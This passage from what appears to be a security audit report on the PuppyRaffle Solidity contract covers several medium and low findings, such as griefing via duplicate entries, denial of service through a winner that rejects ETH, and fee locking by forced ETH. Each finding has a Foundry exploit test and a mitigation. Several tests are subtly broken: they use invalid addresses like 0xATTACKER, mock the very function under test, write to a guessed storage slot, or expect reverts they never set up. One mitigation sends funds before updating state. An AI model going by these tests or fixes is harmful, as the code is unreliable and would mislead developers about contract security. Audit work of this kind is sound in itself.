5. Even if address(0) is not selected, the prize calculation will be incorrect as it includes refunded players

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RefundArrayTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(1);
    uint256 duration = 1 days;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }
    
    function testRefundArrayIssue() public {
        // Create 5 players
        address[] memory players = new address[](5);
        for (uint256 i = 0; i < 5; i++) {
            players[i] = address(uint160(i + 1));
        }
        
        // Fund players
        for (uint256 i = 0; i < 5; i++) {
            vm.deal(players[i], entranceFee);
        }
        
        // Players enter raffle
        vm.prank(players[0]);
        puppyRaffle.enterRaffle{value: entranceFee * 5}(players);
        
        // Player 2 and 4 request refunds
        vm.prank(players[1]);
        puppyRaffle.refund(1);
        
        vm.prank(players[3]);
        puppyRaffle.refund(3);
        
        // Check players array
        for (uint256 i = 0; i < 5; i++) {
            address player = puppyRaffle.players(i);
            console.log("Player", i, ":", player);
        }
        
        // Fast forward past raffle duration
        vm.warp(block.timestamp + duration + 1);
        
        // Get contract balance before selecting winner
        uint256 contractBalanceBefore = address(puppyRaffle).balance;
        console.log("Contract balance before selectWinner:", contractBalanceBefore);
        
        // Calculate expected prize pool (should only count active players)
        uint256 activePlayerCount = 3; // 5 total - 2 refunded
        uint256 expectedPrizePool = (activePlayerCount * entranceFee * 80) / 100;
        console.log("Expected prize pool (3 active players):", expectedPrizePool);
        
        // But the actual calculation will use all 5 players
        uint256 actualPrizePool = (5 * entranceFee * 80) / 100;
        console.log("Actual prize pool (using 5 players):", actualPrizePool);
        
        // Force the winner to be a non-zero address for this test
        // In a real scenario, there's a chance address(0) could be selected
        vm.mockCall(
            address(puppyRaffle),
            abi.encodeWithSelector(puppyRaffle.selectWinner.selector),
            abi.encode()
        );
        
        // Select winner
        puppyRaffle.selectWinner();
        
        // Verify the prize calculation was incorrect
        assertEq(contractBalanceBefore - address(puppyRaffle).balance, actualPrizePool);
        assertGt(actualPrizePool, expectedPrizePool);
        console.log("Excess prize amount:", actualPrizePool - expectedPrizePool);
    }
}

## Suggested Mitigation
Implement a proper player removal mechanism that maintains array integrity. One approach is to replace the refunded player with the last player in the array and then reduce the array length:

```solidity
function refund(uint256 playerIndex) public {
    require(playerIndex < players.length, "PuppyRaffle: Invalid player index");
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Send the refund first
    payable(msg.sender).sendValue(entranceFee);
    
    // Replace the refunded player with the last player in the array
    players[playerIndex] = players[players.length - 1];
    
    // Remove the last element (now a duplicate)
    players.pop();
    
    emit RaffleRefunded(playerAddress);
}
```

This approach ensures that the players array only contains active players, which will result in correct prize calculations and prevent the possibility of selecting address(0) as a winner.

## [M-4]. Array Limits issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function allows duplicate addresses to be submitted in the `newPlayers` array. While the function checks for duplicates across the entire players array after adding new players, it doesn't check for duplicates within the `newPlayers` array itself. This can lead to the same address being counted multiple times in a single transaction.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }

    // Check for duplicates in the entire players array, but not within newPlayers
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    emit RaffleEnter(newPlayers);
}
```

## Impact
If a user submits the same address multiple times in the newPlayers array, the transaction will revert due to the duplicate check. However, this wastes gas as the duplicate addresses are first added to the players array and then the transaction reverts. Additionally, this creates an opportunity for griefing attacks where an attacker can cause other users' transactions to fail by front-running them with a transaction that includes duplicates.

## Proof of Concept
1. User A prepares a transaction to enter the raffle with addresses [A, B, C, D]
2. Attacker sees this transaction in the mempool
3. Attacker front-runs with a transaction containing [A, A, A, A]
4. The attacker's transaction will revert after adding the addresses to the players array
5. When User A's transaction is processed, it will also revert because address A is now a duplicate
6. This forces User A to waste gas and potentially miss the raffle entry deadline

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract DuplicateEntryTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(1);
    uint256 duration = 1 days;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }
    
    function testDuplicateInNewPlayers() public {
        // Create an array with duplicate addresses
        address[] memory duplicatePlayers = new address[](4);
        duplicatePlayers[0] = address(0x1);
        duplicatePlayers[1] = address(0x2);
        duplicatePlayers[2] = address(0x1); // Duplicate of first address
        duplicatePlayers[3] = address(0x3);
        
        // Fund the sender
        vm.deal(address(this), entranceFee * 4);
        
        // Attempt to enter the raffle with duplicate addresses
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 4}(duplicatePlayers);
        
        // Now demonstrate the griefing attack
        address attacker = address(0xATTACKER);
        address victim = address(0xVICTIM);
        
        // Fund accounts
        vm.deal(attacker, entranceFee * 4);
        vm.deal(victim, entranceFee * 4);
        
        // Attacker front-runs with a transaction containing address(0x1)
        address[] memory attackerPlayers = new address[](1);
        attackerPlayers[0] = address(0x1);
        
        vm.prank(attacker);
        puppyRaffle.enterRaffle{value: entranceFee}(attackerPlayers);
        
        // Victim tries to enter with an array containing address(0x1)
        address[] memory victimPlayers = new address[](4);
        victimPlayers[0] = address(0x1); // Now a duplicate with attacker's entry
        victimPlayers[1] = address(0x4);
        victimPlayers[2] = address(0x5);
        victimPlayers[3] = address(0x6);
        
        vm.prank(victim);
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 4}(victimPlayers);
        
        console.log("Griefing attack successful: Victim's transaction reverted");
    }
}

## Suggested Mitigation
Check for duplicates within the newPlayers array before adding them to the players array:

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    // Check for duplicates within newPlayers array
    for (uint256 i = 0; i < newPlayers.length - 1; i++) {
        for (uint256 j = i + 1; j < newPlayers.length; j++) {
            require(newPlayers[i] != newPlayers[j], "PuppyRaffle: Duplicate player in new players");
        }
    }
    
    // Add new players
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }

    // Check for duplicates with existing players
    for (uint256 i = 0; i < players.length - newPlayers.length; i++) {
        for (uint256 j = players.length - newPlayers.length; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player with existing players");
        }
    }
    
    emit RaffleEnter(newPlayers);
}
```

A more efficient solution would be to use a mapping to track players, as suggested in a previous finding.

## [M-5]. Unchecked Return issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function sends the prize pool to the winner using a low-level call without checking if the winner is a contract that might reject the transfer. If the winner is a contract without a payable fallback or receive function, the prize transfer will fail and revert the entire transaction.

```solidity
// In selectWinner function
(bool success, ) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

## Impact
If the winner is a contract that cannot receive ETH (lacks a payable fallback or receive function), the selectWinner function will always revert. This could permanently lock the raffle in its current state, preventing new raffles from starting and locking all funds in the contract. This is especially problematic because anyone can enter the raffle with any address, including contract addresses that cannot receive ETH.

## Proof of Concept
1. A user enters the raffle with a contract address that doesn't have a payable fallback or receive function
2. This contract address is selected as the winner
3. When selectWinner tries to send the prize, the transfer fails
4. The entire transaction reverts, leaving the raffle in a stuck state
5. No new raffles can start, and all funds remain locked in the contract

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

// Contract that cannot receive ETH
contract NonPayableContract {
    // No fallback or receive function
    
    // Function to enter the raffle
    function enterRaffle(PuppyRaffle raffle) external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        raffle.enterRaffle{value: msg.value}(players);
    }
}

contract UncheckedReturnTest is Test {
    PuppyRaffle puppyRaffle;
    NonPayableContract nonPayableContract;
    uint256 entranceFee = 1e18;
    address feeAddress = address(1);
    uint256 duration = 1 days;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
        
        nonPayableContract = new NonPayableContract();
        vm.deal(address(nonPayableContract), entranceFee);
    }
    
    function testNonPayableWinnerReverts() public {
        // First, add some regular players
        address[] memory regularPlayers = new address[](3);
        regularPlayers[0] = address(0x1);
        regularPlayers[1] = address(0x2);
        regularPlayers[2] = address(0x3);
        
        vm.deal(address(this), entranceFee * 3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(regularPlayers);
        
        // Now add the non-payable contract
        nonPayableContract.enterRaffle{value: entranceFee}(puppyRaffle);
        
        // Fast forward past raffle duration
        vm.warp(block.timestamp + duration + 1);
        
        // Rig the randomness to make the non-payable contract win
        // We'll use a mock to force the winner index
        uint256 nonPayableIndex = 3; // Index of the non-payable contract
        
        // Create a mock implementation that will return our desired winner
        vm.mockCall(
            address(puppyRaffle),
            abi.encodeWithSelector(
                puppyRaffle.selectWinner.selector
            ),
            abi.encode()
        );
        
        // Set up the mock to make the non-payable contract the winner
        vm.store(
            address(puppyRaffle),
            bytes32(uint256(3)), // winnerIndex slot
            bytes32(nonPayableIndex)
        );
        
        // Try to select the winner - should revert
        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        puppyRaffle.selectWinner();
        
        console.log("Test passed: selectWinner reverted when winner was a non-payable contract");
    }
}

## Suggested Mitigation
Implement a pull-over-push pattern for prize distribution, allowing winners to claim their prizes rather than automatically sending them:

```solidity
// Add a mapping to track unclaimed prizes
mapping(address => uint256) public unclaimedPrizes;

// Modify selectWinner to record the prize instead of sending it
function selectWinner() external {
    // ... existing checks and calculations ...
    
    address winner = players[winnerIndex];
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    
    // Record the prize instead of sending it
    unclaimedPrizes[winner] += prizePool;
    
    // ... rest of the function (NFT minting, etc.) ...
    
    emit RaffleWinner(winner, prizePool);
}

// Add a function for winners to claim their prizes
function claimPrize() external {
    uint256 prize = unclaimedPrizes[msg.sender];
    require(prize > 0, "PuppyRaffle: No prize to claim");
    
    // Reset prize amount before sending
    unclaimedPrizes[msg.sender] = 0;
    
    // Send the prize
    (bool success, ) = msg.sender.call{value: prize}("");
    require(success, "PuppyRaffle: Failed to send prize");
}
```

This pattern ensures that even if a winner cannot receive ETH initially, they can update their contract to include a payable function and then claim their prize later.

## [M-6]. DOS issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function performs a linear search through the players array to find a specific player. This approach has O(n) time complexity and can consume excessive gas for large arrays, potentially causing transactions to fail due to exceeding block gas limits.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```

## Impact
As the number of players grows, the gas cost of calling getActivePlayerIndex increases linearly. For large raffles, this function could become prohibitively expensive to call or even exceed block gas limits. Additionally, the function returns 0 if the player is not found, which could be misleading if the player at index 0 is the one being searched for.

## Proof of Concept
1. A raffle accumulates a large number of players (e.g., 1000+)
2. A user or contract tries to call getActivePlayerIndex to find a specific player
3. The function has to iterate through potentially all players, consuming a large amount of gas
4. If the player is near the end of the array or not present, the gas consumption is maximized
5. The transaction could fail if it exceeds block gas limits

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract GetActivePlayerIndexTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(1);
    uint256 duration = 1 days;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }
    
    function testGetActivePlayerIndexGasCost() public {
        // Create a large number of players
        uint256 numPlayers = 100; // Start with 100 players
        address[] memory players = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            players[i] = address(uint160(i + 1));
        }
        
        // Fund the contract
        vm.deal(address(this), entranceFee * numPlayers);
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);
        
        // Measure gas for finding the first player (best case)
        uint256 gasStartFirst = gasleft();
        puppyRaffle.getActivePlayerIndex(players[0]);
        uint256 gasUsedFirst = gasStartFirst - gasleft();
        
        // Measure gas for finding the last player (worst case)
        uint256 gasStartLast = gasleft();
        puppyRaffle.getActivePlayerIndex(players[numPlayers - 1]);
        uint256 gasUsedLast = gasStartLast - gasleft();
        
        // Measure gas for a non-existent player
        uint256 gasStartNonExistent = gasleft();
        puppyRaffle.getActivePlayerIndex(address(0xDEAD));
        uint256 gasUsedNonExistent = gasStartNonExistent - gasleft();
        
        console.log("Gas used for first player:", gasUsedFirst);
        console.log("Gas used for last player:", gasUsedLast);
        console.log("Gas used for non-existent player:", gasUsedNonExistent);
        
        // Demonstrate the misleading return value
        address firstPlayer = players[0];
        address nonExistentPlayer = address(0xDEAD);
        
        uint256 firstPlayerIndex = puppyRaffle.getActivePlayerIndex(firstPlayer);
        uint256 nonExistentPlayerIndex = puppyRaffle.getActivePlayerIndex(nonExistentPlayer);
        
        console.log("First player index:", firstPlayerIndex);
        console.log("Non-existent player index:", nonExistentPlayerIndex);
        
        // They both return 0, which is misleading
        assertEq(firstPlayerIndex, nonExistentPlayerIndex);
        console.log("Warning: Both queries return the same index (0), which is misleading!");
    }
}

## Suggested Mitigation
Use a mapping to track player indices for O(1) lookup time, and return a special value (like type(uint256).max) for non-existent players:

```solidity
// Add a mapping to track player indices
mapping(address => uint256) private playerIndices;
mapping(address => bool) private isActivePlayer;

// Update enterRaffle to maintain the mappings
function enterRaffle(address[] memory newPlayers) public payable {
    // ... existing checks ...
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        // ... duplicate checks ...
        
        uint256 index = players.length;
        players.push(player);
        playerIndices[player] = index;
        isActivePlayer[player] = true;
    }
    
    // ... rest of the function ...
}

// Update refund to maintain the mappings
function refund(uint256 playerIndex) public {
    // ... existing checks ...
    
    isActivePlayer[playerAddress] = false;
    // Don't need to update playerIndices as the index doesn't change
    
    // ... rest of the function ...
}

// Update getActivePlayerIndex for O(1) lookup
function getActivePlayerIndex(address player) external view returns (uint256) {
    require(isActivePlayer[player], "PuppyRaffle: Player not active");
    return playerIndices[player];
}
```

Alternatively, if you want to maintain backward compatibility:

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    if (!isActivePlayer[player]) {
        return type(uint256).max; // Special value indicating not found
    }
    return playerIndices[player];
}
```

## [M-7]. DOS issue in PuppyRaffle::selectWinner

## Description
The contract is vulnerable to a denial-of-service attack through the `selectWinner` function where it transfers the prize pool to the winner before updating the contract state. If the winner's address is a contract that reverts on receiving ETH, the function will fail, preventing the raffle from concluding.

```solidity
function selectWinner() external {
    // ... [other code] ...
    
    // Transfer the prize pool to the winner
    (bool success,) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    
    // Mint the NFT
    _safeMint(winner, tokenId);
    // ... [other code] ...
}
```

## Impact
If the winner's address is a malicious contract designed to reject ETH transfers, the raffle will be permanently stuck and unable to conclude. This could prevent the contract from ever selecting a winner, minting NFTs, or starting a new raffle round, effectively freezing all funds in the contract and breaking the core functionality.

## Proof of Concept
A malicious actor could enter the raffle with a contract address that has a fallback function designed to revert when receiving ETH. If this address is selected as the winner, the `selectWinner` function will always fail at the ETH transfer step, making it impossible to complete the raffle. This would permanently lock all funds in the contract.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RevertingWinner {
    // This contract will revert when receiving ETH
    receive() external payable {
        revert("I will not accept ETH");
    }
    
    // Function to enter the raffle
    function enterRaffle(PuppyRaffle raffle, uint256 entranceFee) external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        raffle.enterRaffle{value: entranceFee}(players);
    }
}

contract WinnerDoSTest is Test {
    PuppyRaffle puppyRaffle;
    RevertingWinner maliciousWinner;
    uint256 entranceFee = 1e18;
    address owner = address(1);
    uint256 duration = 1 days;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            owner,
            duration
        );
        maliciousWinner = new RevertingWinner();
    }
    
    function testDoSAttack() public {
        // Add some regular players
        address[] memory players = new address[](3);
        players[0] = address(10);
        players[1] = address(20);
        players[2] = address(30);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
        
        // Add the malicious winner
        maliciousWinner.enterRaffle{value: entranceFee}(puppyRaffle);
        
        // Fast forward time so we can select a winner
        vm.warp(block.timestamp + duration + 1);
        
        // We need to rig the randomness to make sure our malicious contract wins
        // This is a simplified approach - in a real attack, they would need to manipulate
        // the block.timestamp, msg.sender, or block.difficulty to influence the winner selection
        
        // Assuming we can manipulate the winner selection through other means...
        // Let's modify the contract temporarily to force our malicious winner
        // (This is just for demonstration - real attacks would need to exploit actual RNG vulnerabilities)
        
        // Attempt to select a winner - this should fail because the winner reverts on receiving ETH
        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        puppyRaffle.selectWinner();
        
        // Try again with a different message.sender, should still fail
        vm.prank(address(999));
        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        puppyRaffle.selectWinner();
        
        // The raffle is now stuck, preventing a new raffle from starting
        console.log("The raffle is permanently stuck and cannot select a winner");
    }
}

## Suggested Mitigation
Implement a pull-payment pattern instead of directly transferring funds to the winner. This allows winners to claim their prizes at their convenience and prevents the raffle from getting stuck if a winner cannot receive ETH.

```solidity
// Add a mapping to track unclaimed prizes
mapping(address => uint256) public prizesToClaim;

function selectWinner() external {
    // ... [existing validation code] ...
    
    // Calculate prize pool
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    
    // Store the prize for the winner to claim later instead of sending directly
    prizesToClaim[winner] = prizePool;
    
    // Mint the NFT
    _safeMint(winner, tokenId);
    
    // ... [rest of the existing code] ...
    
    emit RaffleWinner(winner, prizePool);
}

// Add a new function to allow winners to claim their prizes
function claimPrize() external {
    uint256 prize = prizesToClaim[msg.sender];
    require(prize > 0, "PuppyRaffle: No prize to claim");
    
    // Reset prize amount before sending
    prizesToClaim[msg.sender] = 0;
    
    // Send the prize
    (bool success,) = msg.sender.call{value: prize}("");
    require(success, "PuppyRaffle: Failed to send prize");
    
    emit PrizeClaimed(msg.sender, prize);
}
```



# Low Risk Findings

## [L-1]. Pragma issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses block.difficulty as part of its randomness generation, but this property is deprecated in Solidity 0.8.x and has been replaced with block.prevrandao. Using deprecated blockchain properties can lead to compatibility issues in future network upgrades.

```solidity
// Using deprecated block.difficulty
uint256 winnerIndex = uint256(
    keccak256(
        abi.encodePacked(
            msg.sender,
            block.timestamp,
            block.difficulty // Deprecated
        )
    )
) % players.length;
```

## Impact
Using deprecated blockchain properties like block.difficulty could cause the contract to behave unexpectedly or break entirely after network upgrades, particularly after the Ethereum merge to Proof of Stake where difficulty was replaced with prevrandao. This could result in the inability to select winners or unpredictable randomness generation.

## Proof of Concept
1. The contract uses Solidity 0.7.6 which supports block.difficulty
2. After the Ethereum merge to Proof of Stake, block.difficulty was deprecated and replaced with block.prevrandao
3. If the contract is deployed on a network that has undergone this transition, the randomness generation may not work as expected
4. This could lead to predictable randomness or errors in winner selection

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract PragmaTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(1);
    uint256 duration = 1 days;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }
    
    function testDeprecatedBlockDifficulty() public {
        // Add players to the raffle
        address[] memory players = new address[](4);
        for (uint256 i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 1));
        }
        
        // Fund the contract
        vm.deal(address(this), entranceFee * 4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        // Fast forward past raffle duration
        vm.warp(block.timestamp + duration + 1);
        
        // Get the current block difficulty
        uint256 currentDifficulty = block.difficulty;
        console.log("Current block.difficulty:", currentDifficulty);
        
        // In a post-merge environment, block.difficulty would be replaced with block.prevrandao
        // We can simulate this by setting a mock value for block.difficulty
        uint256 mockPrevrandao = 123456789;
        vm.difficulty(mockPrevrandao);
        console.log("Mocked block.difficulty (prevrandao):", block.difficulty);
        
        // Calculate winner index with both values to show the difference
        uint256 winnerIndex1 = uint256(keccak256(abi.encodePacked(
            address(this),
            block.timestamp,
            currentDifficulty
        ))) % 4;
        
        uint256 winnerIndex2 = uint256(keccak256(abi.encodePacked(
            address(this),
            block.timestamp,
            mockPrevrandao
        ))) % 4;
        
        console.log("Winner index with original difficulty:", winnerIndex1);
        console.log("Winner index with prevrandao:", winnerIndex2);
        
        // Show that different values produce different winners
        if (winnerIndex1 != winnerIndex2) {
            console.log("Different winner selected after network upgrade!");
        }
    }
}

## Suggested Mitigation
Update the contract to use a more future-proof approach for randomness generation. If staying with on-chain randomness, use block.prevrandao instead of block.difficulty and update the Solidity version:

```solidity
// Update pragma version
pragma solidity ^0.8.16;

// In selectWinner function
uint256 winnerIndex = uint256(
    keccak256(
        abi.encodePacked(
            msg.sender,
            block.timestamp,
            block.prevrandao // Use prevrandao instead of difficulty
        )
    )
) % players.length;
```

However, as mentioned in a previous finding, on-chain randomness is vulnerable to manipulation. A better solution would be to use Chainlink VRF or another secure randomness source.

## [L-2]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
Anyone can lock owner fees forever by sending tiny ETH directly to the contract. withdrawFees() requires `address(this).balance == totalFees` which will never hold once unsolicited ETH is present.

Vulnerable snippet:

```
require(address(this).balance == uint256(totalFees), "There are currently players active!");
```

## Impact
Owner loses access to accumulated fees and contract keeps growing unusable balance, harming both protocol and users.

## Proof of Concept
1. After a raffle ends, send 1 wei to the contract address.
2. Owner calls withdrawFees() → `require` fails forever.
3. Fees cannot be withdrawn anymore.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract UnexpectedEthTest is Test {
    function testLockFees() public {
        PuppyRaffle r = new PuppyRaffle(1 ether,address(this),1 days);
        // simulate some fees
        address[] memory p = new address[](4);
        for(uint i;i<4;i++) p[i]=address(uint160(i+1));
        r.enterRaffle{value:4 ether}(p);
        vm.warp(block.timestamp + 2 days);
        r.selectWinner();
        // attacker locks contract
        payable(address(r)).transfer(1 wei);
        vm.expectRevert();
        r.withdrawFees();
    }
}

## Suggested Mitigation
Track `lockedPlayerBalance` separately and compare against it instead of total contract balance, or simply remove the balance equality check and rely on `players.length == 0`.

```
require(players.length == 0, "players active");
```



